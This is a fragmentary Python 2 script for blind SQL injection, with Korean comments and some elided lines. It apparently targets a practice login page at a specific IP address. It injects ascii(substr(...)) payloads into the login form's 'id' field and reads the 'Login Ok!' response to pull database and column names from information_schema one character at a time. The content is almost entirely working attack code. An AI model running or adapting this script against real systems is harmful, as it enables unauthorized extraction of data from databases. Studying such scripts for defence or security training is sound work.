...
url = "http://203.229.206.22/~wing608/webstudy/att/04/blind.php" # change URL
answer = "Login Ok!"  # change ANSWER

def data_res(payload) :
    
    data ={"id" : payload,"login":"로그인"} #change DATA
    ...
    for num3 in range(0,15) : 
        ...
        for num2 in range(1,30) :  # DB 이름 찾기 
            for num in range(20,127) : 
                ...
                #payload = "' or ascii(substr((select column_name from information_schema.columns where table_name =\'"+table_name+"\' limit 2,1),"+str(num2)+",1))="+str(num)+"#"
                res = data_res(payload)
                #print payload
                if answer in res.text : 
                    print str(chr(num))
